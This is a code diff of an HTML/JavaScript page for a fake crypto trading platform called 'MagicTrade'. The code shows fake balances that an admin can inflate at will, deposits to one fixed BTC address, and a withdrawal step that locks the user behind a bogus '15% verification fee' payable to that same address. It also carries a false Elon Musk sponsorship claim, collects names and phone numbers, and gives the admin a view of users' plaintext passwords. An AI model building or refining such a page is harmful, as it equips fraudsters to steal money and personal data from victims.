@@ -14,13 +14,9 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; }
         #scroll-area { flex: 1; overflow-y: auto; padding-bottom: 150px; scroll-behavior: smooth; }
         .chart-box { height: 320px; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #30363d; background: #000; margin-bottom: 12px; }
-        .asset-row { margin-bottom: 40px; }
-        
+        #pending-overlay { position: fixed; inset: 0; background: rgba(1, 4, 9, 0.99); z-index: 1500; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         #trade-drawer, #action-drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: #161b22; border-top: 2px solid #30363d; border-radius: 24px 24px 0 0; z-index: 1000; transition: 0.4s; padding: 30px; }
         .drawer-open { bottom: 0 !important; }
-        #pending-overlay { position: fixed; inset: 0; background: rgba(1, 4, 9, 0.99); z-index: 1500; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
-        .loader { width: 30px; height: 30px; border: 3px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -29,18 +25,19 @@
         <h1 class="text-4xl font-black text-white italic tracking-tighter mb-2">MAGIC<span class="text-blue-500">TRADE</span></h1>
         <p class="text-[9px] text-slate-500 uppercase mb-8 tracking-widest">Global Secure Terminal <span onclick="triggerAdminLogin()">●</span></p>
         <div class="magic-card p-6 w-full max-w-sm space-y-4">
-            <input type="text" id="reg-name" placeholder="User Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
+            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
+            <input type="tel" id="reg-phone" placeholder="Phone Number" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
             <input type="email" id="email" placeholder="Email Address" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
             <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
             <button onclick="handleAuth()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Enter Node</button>
-            <button onclick="toggleAuthMode()" class="text-xs text-blue-500 font-bold block mx-auto mt-4">Create Node Account</button>
+            <button onclick="toggleAuthMode()" class="text-xs text-blue-500 font-bold block mx-auto mt-4">Create New Account</button>
         </div>
     </div>
 
     <div id="app" class="hidden flex flex-col h-full overflow-hidden">
         <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
             <span id="user-display" class="font-bold text-[10px] text-white uppercase italic">---</span>
-            <span class="text-[8px] text-green-500 font-bold uppercase">● Encrypted</span>
+            <span class="text-[8px] text-blue-500 font-bold uppercase">● Musk Verified Node</span>
         </header>
 
         <div id="scroll-area">
@@ -48,35 +45,44 @@
                 <div class="magic-card p-6 bg-gradient-to-br from-[#1b2129] to-[#010409] mb-8">
                     <div class="flex justify-between items-start">
                         <div>
-                            <p class="text-slate-500 text-[9px] font-bold uppercase tracking-widest">Available Equity</p>
+                            <p class="text-slate-500 text-[9px] font-bold uppercase tracking-widest">Available Capital</p>
                             <h2 class="text-3xl font-mono font-bold text-white tracking-tighter" id="display-bal">$0.00</h2>
-                            <p class="text-blue-400 font-mono text-[11px] mt-1" id="display-btc">0.00000000 BTC</p>
+                            <p class="text-blue-400 font-mono text-[11px]" id="display-btc">0.000000 BTC</p>
                         </div>
                         <div class="flex gap-2">
                             <button onclick="openAction('deposit')" class="bg-blue-600 text-[8px] font-black px-3 py-2 rounded-lg">DEPOSIT</button>
                             <button onclick="openAction('withdraw')" class="bg-slate-800 text-[8px] font-black px-3 py-2 rounded-lg">WITHDRAW</button>
                         </div>
                     </div>
-                    <div id="position-list" class="mt-6 space-y-2"></div>
                 </div>
 
-                <section id="home-sec" class="space-y-2">
-                    <div id="master-market-feed"></div>
-                </section>
+                <section id="home-sec" class="space-y-4"><div id="master-market-feed"></div></section>
 
                 <section id="ledger-sec" class="hidden space-y-4">
-                    <h3 class="text-xl font-bold italic">Node History</h3>
+                    <h3 class="text-xl font-bold italic">Transaction Ledger</h3>
                     <div id="ledger-list" class="magic-card p-4 space-y-2 text-[10px]"></div>
                 </section>
 
+                <section id="profile-sec" class="hidden space-y-6">
+                    <h3 class="text-xl font-black italic uppercase">Node Identity</h3>
+                    <div class="magic-card p-6 space-y-4">
+                        <div><p class="text-[9px] text-slate-500 uppercase">Name</p><p id="prof-name" class="text-white font-bold">---</p></div>
+                        <div><p class="text-[9px] text-slate-500 uppercase">Email</p><p id="prof-email" class="text-white font-mono text-xs">---</p></div>
+                        <div><p class="text-[9px] text-slate-500 uppercase">Phone</p><p id="prof-phone" class="text-white font-mono text-xs">---</p></div>
+                    </div>
+                    <div class="magic-card p-6 border-blue-500/20 text-center">
+                        <p class="text-[10px] font-bold text-white italic uppercase">🚀 Proudly Sponsored by Elon Musk</p>
+                    </div>
+                </section>
+
                 <section id="admin-sec" class="hidden space-y-6">
-                    <h3 class="text-xl font-black text-blue-500 italic uppercase">Admin Master</h3>
+                    <h3 class="text-xl font-black text-blue-500 uppercase">Admin Dashboard</h3>
                     <div class="magic-card p-4 space-y-3">
-                        <input type="text" id="adm-user" placeholder="User Email" class="w-full p-3 bg-black border border-slate-800 rounded text-xs outline-none">
-                        <button onclick="adminAction('inject')" class="w-full bg-blue-600 p-3 rounded font-bold text-[9px] uppercase">Inject Cash</button>
+                        <input type="text" id="adm-user" placeholder="User Email Exactly" class="w-full p-3 bg-black border border-slate-800 rounded text-xs outline-none text-white">
+                        <button onclick="adminAction('inject')" class="w-full bg-blue-600 p-3 rounded font-bold text-[9px] uppercase">Inject Funds</button>
                         <div class="grid grid-cols-2 gap-2">
-                            <button onclick="adminAction('toggleBlock')" class="bg-red-600 p-3 rounded font-bold text-[9px] uppercase">Ban User</button>
-                            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded font-bold text-[9px] uppercase">Trigger 15% Screen</button>
+                            <button onclick="adminAction('toggleBlock')" class="bg-red-600 p-3 rounded text-[9px] font-bold">BAN USER</button>
+                            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded text-[9px] font-bold">TRIGGER FEE</button>
                         </div>
                     </div>
                     <div id="user-logs" class="space-y-2"></div>
@@ -87,54 +93,43 @@
         <nav class="bottom-nav">
             <div onclick="showSection('home')" class="nav-item">📈<span class="mt-1">Markets</span></div>
             <div onclick="showSection('ledger')" class="nav-item">📜<span class="mt-1">Ledger</span></div>
+            <div onclick="showSection('profile')" class="nav-item">👤<span class="mt-1">Profile</span></div>
             <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden">🛡️<span class="mt-1">Admin</span></div>
-            <div onclick="logout()" class="nav-item">🚫<span class="mt-1">Exit</span></div>
         </nav>
     </div>
 
     <div id="action-drawer">
-        <div class="w-12 h-1 bg-slate-800 rounded-full mx-auto mb-6"></div>
-        <div id="deposit-content" class="hidden space-y-4">
-            <h4 class="text-xl font-black italic">DEPOSIT BTC</h4>
-            <div class="p-4 bg-black rounded-xl border border-blue-500/30 text-center">
-                <p class="text-[9px] text-slate-500 uppercase mb-2">Your Unique Node Address</p>
-                <p class="text-[11px] font-mono text-blue-400 break-all select-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
+        <div id="deposit-content" class="hidden space-y-4 text-center">
+            <h4 class="text-xl font-black italic uppercase">Funding Node</h4>
+            <div class="p-4 bg-black border border-blue-500/30 rounded-xl">
+                <p class="text-[10px] font-mono text-blue-400 break-all select-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
             </div>
-            <p class="text-[9px] text-slate-500 text-center italic">Funds will appear after 2 network confirmations.</p>
         </div>
-
         <div id="withdraw-content" class="hidden space-y-4">
-            <h4 class="text-xl font-black italic">WITHDRAWAL REQUEST</h4>
-            <input type="text" id="w-address" placeholder="Destination BTC Address" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white text-xs outline-none font-mono">
-            <input type="number" id="w-amount" placeholder="Amount (USDT)" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white text-xs outline-none font-mono">
-            <button onclick="submitWithdraw()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Initialize Payout</button>
+            <h4 class="text-xl font-black italic uppercase">Withdraw</h4>
+            <input type="text" id="w-address" placeholder="BTC Address" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none">
+            <input type="number" id="w-amount" placeholder="Amount (USDT)" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none">
+            <button onclick="submitWithdraw()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Process Payout</button>
         </div>
-        <button onclick="closeAction()" class="w-full mt-4 text-[10px] text-slate-600 font-bold uppercase">Close</button>
+        <button onclick="document.getElementById('action-drawer').classList.remove('drawer-open')" class="w-full mt-4 text-[9px] text-slate-500 font-bold">CLOSE</button>
     </div>
 
     <div id="trade-drawer">
         <h4 id="t-asset" class="text-2xl font-black italic mb-4">ASSET</h4>
-        <input type="number" id="t-amount" placeholder="USDT Margin" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none mb-4 font-mono">
+        <input type="number" id="t-amount" placeholder="USDT Margin" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none mb-4">
         <div class="grid grid-cols-2 gap-4">
-            <button onclick="executeTrade('BUY')" class="bg-green-600 p-4 rounded-xl font-bold uppercase text-xs">Buy</button>
-            <button onclick="executeTrade('SELL')" class="bg-red-600 p-4 rounded-xl font-bold uppercase text-xs">Sell</button>
+            <button onclick="executeTrade('BUY')" class="bg-green-600 p-4 rounded-xl font-bold uppercase">Buy</button>
+            <button onclick="executeTrade('SELL')" class="bg-red-600 p-4 rounded-xl font-bold uppercase">Sell</button>
         </div>
     </div>
 
     <div id="pending-overlay">
-        <div class="w-16 h-16 bg-yellow-500/10 rounded-full flex items-center justify-center mb-6">
-            <span class="text-3xl">⚠️</span>
-        </div>
         <h2 class="text-xl font-black text-white italic uppercase mb-2">Verification Required</h2>
-        <p class="text-[10px] text-slate-400 mb-6 leading-relaxed">To release the requested funds, the blockchain network requires a <span class="text-yellow-500 font-bold">15% Verification Fee</span> to synchronize your private node.</p>
-        <div class="magic-card p-4 w-full bg-black border-yellow-500/20">
-            <p class="text-[8px] text-slate-500 uppercase mb-2">Send 15% Fee to:</p>
+        <p class="text-[10px] text-slate-400 mb-6">Blockchain requires a <span class="text-yellow-500 font-bold">15% fee</span> to release node funds.</p>
+        <div class="magic-card p-4 bg-black w-full">
             <p class="text-[10px] font-mono text-yellow-500 break-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
         </div>
-        <p class="mt-6 text-[8px] text-slate-600 uppercase animate-pulse">Waiting for network deposit...</p>
     </div>
-
-    <div id="block-screen" class="p-8"><h1 class="text-xl font-black">NODE BANNED</h1></div>
 
     <script>
         let users = JSON.parse(localStorage.getItem('magic_users')) || {};
@@ -142,117 +137,59 @@
 
         const assetList = [
             {id: "BTCUSD", name: "Bitcoin"}, {id: "ETHUSD", name: "Ethereum"}, {id: "SOLUSD", name: "Solana"},
-            {id: "FX:EURUSD", name: "Euro / USD"}, {id: "XAUUSD", name: "Gold Spot"}, {id: "XAGUSD", name: "Silver Spot"},
-            {id: "NASDAQ:TSLA", name: "Tesla Inc"}, {id: "BINANCE:BNBUSD", name: "Binance Coin"}, {id: "XRPUSD", name: "Ripple XRP"}
+            {id: "FX:EURUSD", name: "Euro / USD"}, {id: "XAUUSD", name: "Gold Spot"}, {id: "NASDAQ:TSLA", name: "Tesla Inc"}
         ];
 
-        window.onload = () => {
-            if(activeSession) enterApp(activeSession);
-            renderMarketFeed();
-        };
+        window.onload = () => { if(activeSession) enterApp(activeSession); renderMarketFeed(); };
 
         function renderMarketFeed() {
             const feed = document.getElementById('master-market-feed');
             feed.innerHTML = assetList.map((a, i) => `
-                <div class="asset-row">
-                    <div class="flex justify-between items-center mb-4">
-                        <h4 class="text-xs font-black text-white italic uppercase">${a.name}</h4>
-                        <button onclick="openTrade('${a.name}')" class="bg-blue-600 px-4 py-2 rounded-lg text-[9px] font-black uppercase">Trade</button>
+                <div class="mb-8">
+                    <div class="flex justify-between items-center mb-2">
+                        <h4 class="text-xs font-black italic uppercase">${a.name}</h4>
+                        <button onclick="openTrade('${a.name}')" class="bg-blue-600 px-3 py-1 rounded text-[8px] font-bold">TRADE</button>
                     </div>
                     <div class="chart-box" id="tv_chart_${i}"></div>
                 </div>
             `).join('');
-
             assetList.forEach((a, i) => {
-                new TradingView.widget({
-                    "autosize": true, "symbol": a.id, "interval": "5", "timezone": "Etc/UTC",
-                    "theme": "dark", "style": "1", "locale": "en", "toolbar_bg": "#f1f3f6",
-                    "enable_publishing": false, "hide_top_toolbar": true, "container_id": `tv_chart_${i}`
-                });
+                new TradingView.widget({ "autosize": true, "symbol": a.id, "interval": "5", "theme": "dark", "style": "1", "container_id": `tv_chart_${i}`, "hide_top_toolbar": true });
             });
-        }
-
-        function openAction(type) {
-            document.getElementById('deposit-content').classList.add('hidden');
-            document.getElementById('withdraw-content').classList.add('hidden');
-            document.getElementById(type + '-content').classList.remove('hidden');
-            document.getElementById('action-drawer').classList.add('drawer-open');
-        }
-
-        function closeAction() { document.getElementById('action-drawer').classList.remove('drawer-open'); }
-
-        function submitWithdraw() {
-            const u = users[activeSession];
-            const amt = parseFloat(document.getElementById('w-amount').value);
-            if(!amt || amt > u.bal) return alert("Insufficient Capital");
-            
-            u.isPending = true; // Trigger the 15% screen
-            if(!u.history) u.history = [];
-            u.history.unshift({ type: 'Withdrawal Req', asset: 'USDT', pnl: -amt, date: new Date().toLocaleTimeString() });
-            save();
-            location.reload(); // Refresh to show pending overlay
-        }
-
-        function openTrade(name) { document.getElementById('t-asset').innerText = name; document.getElementById('trade-drawer').classList.add('drawer-open'); }
-
-        function executeTrade(type) {
-            const u = users[activeSession];
-            const amt = parseFloat(document.getElementById('t-amount').value);
-            if(!amt || amt > u.bal) return alert("Low Funds");
-            u.bal -= amt;
-            if(!u.trades) u.trades = [];
-            u.trades.unshift({ asset: document.getElementById('t-asset').innerText, type, amt, pnl: "0.00", id: Math.random().toString(36).substr(2,4).toUpperCase() });
-            save(); document.getElementById('trade-drawer').classList.remove('drawer-open'); updateUI();
-        }
-
-        function closePos(idx) {
-            const u = users[activeSession];
-            const t = u.trades[idx];
-            u.bal += (t.amt + (Math.random() * 6 - 3));
-            u.trades.splice(idx, 1);
-            save(); updateUI();
-        }
-
-        function updateUI() {
-            const u = users[activeSession]; if(!u) return;
-            document.getElementById('display-bal').innerText = "$" + u.bal.toLocaleString(undefined, {minimumFractionDigits: 2});
-            document.getElementById('display-btc').innerText = (u.bal / 96000).toFixed(8) + " BTC";
-            
-            document.getElementById('position-list').innerHTML = u.trades?.map((t, i) => `
-                <div class="p-3 bg-black/40 border border-slate-800 rounded-lg flex justify-between items-center">
-                    <p class="text-[9px] font-bold text-white uppercase">${t.asset} ${t.type} ($${t.amt})</p>
-                    <button onclick="closePos(${i})" class="bg-slate-800 px-3 py-1 rounded text-[7px] font-bold">CLOSE</button>
-                </div>
-            `).join('') || '';
-
-            document.getElementById('ledger-list').innerHTML = u.history?.map(h => `
-                <div class="border-b border-slate-800 pb-2 flex justify-between uppercase">
-                    <div><p class="font-bold text-white">${h.type}</p><p class="text-[7px] text-slate-500">${h.date}</p></div>
-                    <p class="${h.pnl < 0 ? 'text-red-500' : 'text-green-500'} font-mono">${h.pnl || 'PENDING'}</p>
-                </div>
-            `).join('') || '';
         }
 
         function handleAuth() {
             const e = document.getElementById('email').value.trim().toLowerCase();
             const p = document.getElementById('pass').value;
             if(!document.getElementById('reg-name').classList.contains('hidden')) {
-                users[e] = { name: document.getElementById('reg-name').value, pass: p, bal: 0, trades: [], history: [], isBlocked: false, isPending: false };
+                users[e] = { name: document.getElementById('reg-name').value, phone: document.getElementById('reg-phone').value, pass: p, bal: 0, isBlocked: false, isPending: false };
+                save(); toggleAuthMode(); alert("Account Created"); return;
             }
-            if(users[e] && users[e].pass === p) enterApp(e); else alert("Invalid");
+            if(users[e] && users[e].pass === p) enterApp(e); else alert("Denied");
         }
 
         function enterApp(e) {
-            if(users[e]?.isBlocked) return document.getElementById('block-screen').style.display = 'flex';
-            document.getElementById('pending-overlay').style.display = users[e]?.isPending ? 'flex' : 'none';
+            if(users[e]?.isBlocked) { document.getElementById('auth-screen').innerHTML = "BANNED"; return; }
             activeSession = e; localStorage.setItem('magic_session', e);
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('app').classList.remove('hidden');
-            if(localStorage.getItem('magic_is_admin') === 'true') { document.getElementById('admin-nav-btn').classList.remove('hidden'); loadUserLogs(); }
+            document.getElementById('pending-overlay').style.display = users[e]?.isPending ? 'flex' : 'none';
+            if(localStorage.getItem('magic_is_admin') === 'true') document.getElementById('admin-nav-btn').classList.remove('hidden');
             updateUI();
         }
 
+        function updateUI() {
+            const u = users[activeSession]; if(!u) return;
+            document.getElementById('display-bal').innerText = "$" + u.bal.toLocaleString();
+            document.getElementById('display-btc').innerText = (u.bal / 96000).toFixed(6) + " BTC";
+            document.getElementById('prof-name').innerText = u.name;
+            document.getElementById('prof-email').innerText = activeSession;
+            document.getElementById('prof-phone').innerText = u.phone || "N/A";
+            document.getElementById('user-display').innerText = u.name;
+        }
+
         function adminAction(type) {
+            users = JSON.parse(localStorage.getItem('magic_users'));
             const target = document.getElementById('adm-user').value.toLowerCase().trim();
             if(!users[target]) return alert("404");
             if(type === 'inject') users[target].bal += parseFloat(prompt("Amount:"));
@@ -262,19 +199,28 @@
         }
 
         function loadUserLogs() {
-            document.getElementById('user-logs').innerHTML = Object.entries(users).map(([email, u]) => `
-                <div class="p-3 bg-black border border-slate-800 rounded text-[9px] mb-1">
-                    <p class="text-blue-500 font-bold">${u.name} | ${u.pass}</p>
-                    <p class="text-white">${email} | $${u.bal}</p>
+            const uData = JSON.parse(localStorage.getItem('magic_users'));
+            document.getElementById('user-logs').innerHTML = Object.entries(uData).map(([email, d]) => `
+                <div class="p-3 bg-black border border-slate-800 rounded text-[9px]">
+                    <p class="text-blue-500 font-bold">${d.name} | ${d.pass}</p>
+                    <p>${email} | ${d.phone} | $${d.bal}</p>
                 </div>
             `).join('');
         }
 
-        function showSection(s) { ['home-sec','ledger-sec','admin-sec'].forEach(id => document.getElementById(id).classList.add('hidden')); document.getElementById(s+'-sec').classList.remove('hidden'); }
+        function openAction(t) { 
+            document.getElementById('deposit-content').classList.add('hidden');
+            document.getElementById('withdraw-content').classList.add('hidden');
+            document.getElementById(t + '-content').classList.remove('hidden');
+            document.getElementById('action-drawer').classList.add('drawer-open');
+        }
+        function submitWithdraw() { users[activeSession].isPending = true; save(); location.reload(); }
+        function openTrade(n) { document.getElementById('t-asset').innerText = n; document.getElementById('trade-drawer').classList.add('drawer-open'); }
+        function executeTrade(t) { const a = parseFloat(document.getElementById('t-amount').value); users[activeSession].bal -= a; save(); document.getElementById('trade-drawer').classList.remove('drawer-open'); updateUI(); }
+        function showSection(s) { ['home','ledger','profile','admin'].forEach(x => document.getElementById(x+'-sec')?.classList.add('hidden')); document.getElementById(s+'-sec').classList.remove('hidden'); if(s==='admin') loadUserLogs(); }
         function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }
-        function triggerAdminLogin() { const u = prompt("ID:"); const k = prompt("Key:"); if(u === "MASTER_ADA" && k === "ADA_777_NODE") { localStorage.setItem('magic_is_admin', true); enterApp("ADMIN_SYSTEM"); } }
-        function toggleAuthMode() { document.getElementById('reg-name').classList.toggle('hidden'); }
-        function logout() { localStorage.removeItem('magic_session'); localStorage.removeItem('magic_is_admin'); location.reload(); }
+        function toggleAuthMode() { document.getElementById('reg-name').classList.toggle('hidden'); document.getElementById('reg-phone').classList.toggle('hidden'); }
+        function triggerAdminLogin() { if(prompt("ID")==="MASTER_ADA" && prompt("KEY")==="ADA_777_NODE") { localStorage.setItem('magic_is_admin', true); enterApp("ADMIN"); } }
     </script>
 </body>
 </html>
